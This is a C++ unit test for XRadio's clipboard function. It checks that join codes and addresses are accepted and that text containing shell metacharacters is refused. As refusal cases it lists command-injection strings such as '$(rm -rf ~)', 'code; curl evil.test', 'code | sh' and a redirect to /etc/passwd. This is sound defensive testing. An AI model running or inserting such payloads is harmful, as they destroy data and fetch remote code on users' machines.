// The clipboard, and in particular what it refuses.
//
// This is the one place in XRadio where a string built from network-adjacent
// data reaches a shell on two of the three platforms, so the interesting
// tests are the ones about what does NOT get copied. Whether the copy itself
// works depends on the machine -- a CI runner has no X display and no
// clipboard tool -- so that half is checked for an honest answer rather than
// a successful one.
#include "clipboard.h"

#include <cstdio>
#include <string>

static int failures = 0;
static void check(const std::string& name, bool ok, const std::string& detail = "") {
    printf("  %s  %s", ok ? "PASS" : "FAIL", name.c_str());
    if (!ok && !detail.empty()) printf("   [%s]", detail.c_str());
    printf("\n");
    if (!ok) ++failures;
}

static bool refused(const std::string& text) {
    std::string err;
    const bool ok = xr::clipboard::set(text, &err);
    // On a machine with no clipboard at all everything "fails", so a refusal
    // only counts if it is the refusal we meant.
    return !ok && err.find("nothing to copy") != std::string::npos;
}

int main() {
    printf("\nwhat may be copied\n");
    {
        // Everything XRadio ever puts on the clipboard.
        std::string err;
        const char* kFine[] = {
            "ABCDE-FGHIJ",              // a join code
            "203.0.113.7:49100",        // an address and port
            "192.168.1.20:49100",
            "xradio.example.com:49100",
            "122.800",
        };
        for (const char* t : kFine) {
            err.clear();
            const bool ok = xr::clipboard::set(t, &err);
            // Either it worked, or the machine has no clipboard -- but it
            // must never be refused as unacceptable text.
            check(std::string("'") + t + "' is acceptable text",
                  ok || err.find("nothing to copy") == std::string::npos,
                  err);
        }
    }

    printf("\nand what may not\n");
    {
        check("nothing at all", refused(""));
        check("a shell command substitution", refused("$(rm -rf ~)"));
        check("backticks", refused("`id`"));
        check("a semicolon and another command", refused("code; curl evil.test"));
        check("a pipe", refused("code | sh"));
        check("quotes, which are how clever quoting goes wrong",
              refused("code' ; echo '"));
        check("a newline", refused("line one\nline two"));
        check("a null byte in the middle", refused(std::string("ab\0cd", 5)));
        check("an ampersand", refused("code & sleep 99"));
        check("a redirect", refused("code > /etc/passwd"));
        // A join code is eleven characters; an address is at most a few
        // dozen. Anything page-sized is not one of ours.
        check("something far too long", refused(std::string(400, 'A')));
    }

    printf("\nthe answer is honest either way\n");
    {
        // The button tells the pilot what happened, so a failure has to
        // arrive with a reason and a success without one.
        std::string err;
        const bool ok = xr::clipboard::set("ABCDE-FGHIJ", &err);
        if (ok) {
            check("a successful copy leaves no error behind", err.empty(), err);
            printf("        (this machine has a clipboard)\n");
        } else {
            check("a failed copy says why", !err.empty());
            check("and says something a person could act on", err.size() > 8, err);
            printf("        (no clipboard here: %s)\n", err.c_str());
        }
    }

    printf("\n");
    if (failures) { printf("%d FAILED\n", failures); return 1; }
    printf("all clipboard tests passed\n");
    return 0;
}
